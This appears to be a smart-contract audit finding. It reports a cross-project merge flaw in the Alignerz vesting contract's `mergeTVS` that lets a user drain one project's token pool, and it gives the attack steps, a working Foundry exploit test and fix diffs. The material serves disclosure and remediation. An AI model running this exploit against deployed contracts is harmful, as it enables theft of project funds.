# [000680] [H-4] Cross-project merge drains target pool (project isolation bypass)
  
  ### Summary

`mergeTVS` allows merging NFTs from different `projectId`s as long as the token matches; the merged allocation is paid from the target project’s pool, so a user can import allocations from another project and drain the target project’s token balance.

### Root Cause

 In `AlignerzVesting.sol:1002-1024`, `mergeTVS` checks only token equality (`Different_Tokens()`) and then writes merged flows into `biddingProjects[projectId].allocations[mergedNftId]`, burning the source NFT from `projectIds[i]`. There is no requirement that `projectIds[i] == projectId`, and no accounting adjustment on the source project.

### Internal Pre-conditions

  1. At least two projects exist that use the same token (project 0 and 1).
  2. Attacker owns NFTs in both projects.

### External Pre-conditions

None. 

### Attack Path

  1. Attacker participates in project 0 and project 1 that share the same token; obtains one NFT from each.
  2. Calls `mergeTVS(projectId=0, mergedNftId=NFT0, projectIds=[1], nftIds=[NFT1])`.
  3. Merge succeeds (token check passes), burning NFT1 and appending its flows into project 0’s allocation storage.
  4. Attacker calls `claimTokens(0, NFT0)`; tokens for both original allocations are paid out of project 0’s balance, draining project 0.

### Impact

A malicious user (or any user) can create/acquire NFTs in project A and project B that use the same token, then merge the project B NFT into a project A NFT. Subsequent `claimTokens` on the merged NFT pulls all merged flows from project A’s token reserves, depleting project A to satisfy project B’s vesting obligations. Breaks project isolation; funds of one project can be drained to pay another.

### PoC

```solidity
// SPDX-License-Identifier: MIT
pragma solidity =0.8.29;

import "forge-std/Test.sol";
import {AlignerzVesting} from "../src/contracts/vesting/AlignerzVesting.sol";
import {AlignerzNFT} from "../src/contracts/nft/AlignerzNFT.sol";
import {Aligners26} from "../src/contracts/token/Aligners26.sol";
import {MockUSD} from "../src/MockUSD.sol";

// PoC for cross-project merge drain (assumes mergeTVS is operational)
contract CrossProjectMergeDrain is Test {
    AlignerzVesting private vesting;
    AlignerzNFT private nft;
    Aligners26 private token;
    MockUSD private stable;

    address private attacker = address(0xA11CE);

    function setUp() public {
        stable = new MockUSD();
        token = new Aligners26("26Aligners", "A26Z");
        nft = new AlignerzNFT("AlignerzNFT", "AZNFT", "https://nft.alignerz.bid/");

        vesting = new AlignerzVesting();
        vesting.initialize(address(nft));
        nft.addMinter(address(vesting));
        vesting.setTreasury(address(1));
        vesting.setVestingPeriodDivisor(1);

        token.approve(address(vesting), type(uint256).max);
        stable.mint(attacker, 10_000 ether);
        vm.prank(attacker);
        stable.approve(address(vesting), type(uint256).max);

        vesting.launchBiddingProject(address(token), address(stable), block.timestamp, block.timestamp + 1000, "0x0", false); // project 0
        vesting.launchBiddingProject(address(token), address(stable), block.timestamp, block.timestamp + 1000, "0x0", false); // project 1
        vesting.createPool(0, 1_000 ether, 1 ether, false);
        vesting.createPool(1, 1_000 ether, 1 ether, false);

        vm.prank(attacker);
        vesting.placeBid(0, 100 ether, 10);
        vm.prank(attacker);
        vesting.placeBid(1, 200 ether, 10);

        bytes32 leaf0 = keccak256(abi.encodePacked(attacker, uint256(100 ether), uint256(0), uint256(0)));
        bytes32 leaf1 = keccak256(abi.encodePacked(attacker, uint256(200 ether), uint256(1), uint256(0)));
        bytes32[] memory roots0 = new bytes32[](1);
        bytes32[] memory roots1 = new bytes32[](1);
        roots0[0] = leaf0;
        roots1[0] = leaf1;
        vesting.finalizeBids(0, bytes32(0), roots0, 1 days);
        vesting.finalizeBids(1, bytes32(0), roots1, 1 days);
        vm.prank(attacker);
        uint256 nft0 = vesting.claimNFT(0, 0, 100 ether, new bytes32[](0)); // NFT from project 0
        vm.prank(attacker);
        uint256 nft1 = vesting.claimNFT(1, 0, 200 ether, new bytes32[](0)); // NFT from project 1

        // store IDs for later use
        _nft0 = nft0;
        _nft1 = nft1;
    }

    uint256 private _nft0;
    uint256 private _nft1;

    function testCrossProjectMergeDrainsProject0() public {
        uint256[] memory projectIds = new uint256[](1);
        projectIds[0] = 1; // foreign project
        uint256[] memory nftIds = new uint256[](1);
        nftIds[0] = _nft1; // NFT from project 1

        vm.prank(attacker);
        vesting.mergeTVS(0, _nft0, projectIds, nftIds);

        // Fast-forward vesting
        vm.warp(block.timestamp + 11);

        uint256 balBefore = token.balanceOf(attacker);
        vm.prank(attacker);
        vesting.claimTokens(0, _nft0); // claims both allocations from project 0 balance
        uint256 balAfter = token.balanceOf(attacker);

        // Attacker received 100 (proj0) + 200 (proj1) from project 0's pool
        assertEq(balAfter - balBefore, 300 ether, "drained project 0 to pay project 1 allocation");
    }
}

```

### Mitigation

- **Note**: `mergeTVS` was previously broken by the fee helper; once issue #3 is fixed, this cross-project drain becomes reproducible unless a project check is added.
- **Mitigation**:
  - Fix Issue #3 so `mergeTVS` runs (array allocation/loop increment). Reference patch below
    ```diff
    // protocol/src/contracts/vesting/feesManager/FeesManager.sol
    -for (uint256 i; i < length;) {
    -    feeAmount += calculateFeeAmount(feeRate, amounts[i]);
    -    newAmounts[i] = amounts[i] - feeAmount;
    -}
    +newAmounts = new uint256[](length);
    +for (uint256 i; i < length; i++) {
    +    uint256 fee = calculateFeeAmount(feeRate, amounts[i]);
    +    feeAmount += fee;
    +    newAmounts[i] = amounts[i] - fee;
    +}
    ```
    ```diff
    // protocol/src/contracts/vesting/AlignerzVesting.sol (_computeSplitArrays)
    +alloc.amounts = new uint256[](nbOfFlows);
    +alloc.vestingPeriods = new uint256[](nbOfFlows);
    +alloc.vestingStartTimes = new uint256[](nbOfFlows);
    +alloc.claimedSeconds = new uint256[](nbOfFlows);
    +alloc.claimedFlows = new bool[](nbOfFlows);
    ```
  - Add a same-project guard in `mergeTVS` (reject when `projectIds[i] != projectId`) and regression tests to enforce this. With issue #3 fixed, `protocol/test/CrossProjectMergeDrain.t.sol` demonstrates the drain; after adding the project guard, the merge should revert/prevent the drain.

  